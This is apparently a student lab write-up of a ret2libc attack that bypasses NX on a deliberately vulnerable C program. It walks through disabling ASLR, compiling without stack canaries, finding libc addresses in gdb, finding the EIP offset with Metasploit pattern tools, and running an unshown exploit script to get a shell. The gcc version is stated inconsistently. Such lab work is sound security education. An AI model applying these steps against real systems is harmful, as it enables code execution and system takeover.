Steven Comer
Protection Bypass for NX and ASLR
6 May 2016

Project goal:
	Use "Return to LibC" (ret2libc) to bypass NX on a modern Linux system
	
Implementation description:
	Build payload that calls known address of system on known address of shell string "sh; "
	Overflow buffer
	Insert payload
	Achieve arbitrary execution

Implementation files:
	vuln.c -- vulnerable C program
	exploit.py -- constructs ret2libc payload and exploits vuln binary

Software used:
	Kali Linux x86 v2016.1
	gcc v3.5.1

Protection:
	NX on by default in gcc version 5.3.1
	Turn ASLR off (not persistent through reboot)
		echo 0 > /proc/sys/kernel/randomize_va_space

Compile with:
	gcc -g -fno-stack-protector -mpreferred-stack-boundary=2 -o vuln vuln.c
		*stack canaries (or stack protectors) break this implementation
		*setting the preferred stack boundary reduces gcc-induced clutter for stack alignment

Look for system and exit functions:
	gdb vuln
	r 1234 (forces libraries to load)
	p system
		$1 = {<text variable, no debug info>} 0xb7e3ed00 <__libc_system>
	p exit
		$2 = {<text variable, no debug info>} 0xb7e32a80 <__GI_exit>

Determine the correct amount of filler to put in the payload before the ROP section:
	locate pattern_create
	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb 100
	unique_string = Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

	Use the following as input:
	"A"*1000 + unique_string
	
	Identify the bytes that overwrite EIP:
	0x62413961
	
	locate pattern_offset	
	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 62413961
	[*] Exact match at offset 28
	This means that EIP is overwritten starting with payload[1028]
	Payload is constructed accordingly, see exploit.py
	
Find location of "sh; " in memory:
	gdb vuln
	(gdb) disas main
	0x0804849a <+31>:	push   0x8048550
	
Run the exploit:
	chmod +x exploit.py
	./exploit.py
	echo "ret2libc ftw!"
	Note: The exploit returns a shell with no prompt. If you want a prompt, run the following line:
		python -c 'import pty; pty.spawn("/bin/bash")'
	
Resources:
	https://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf
	https://www.youtube.com/watch?v=HQzzxjqjbaU
	http://www.slideshare.net/saumilshah/dive-into-rop-a-quick-introduction-to-return-oriented-programming
	https://www.exploit-db.com/docs/28479.pdf
	https://github.com/DSUcoder/CSC-840/blob/master/Cycle05/ROP.pdf
	https://www.trustwave.com/Resources/SpiderLabs-Blog/Baby-s-first-NX-ASLR-bypass/

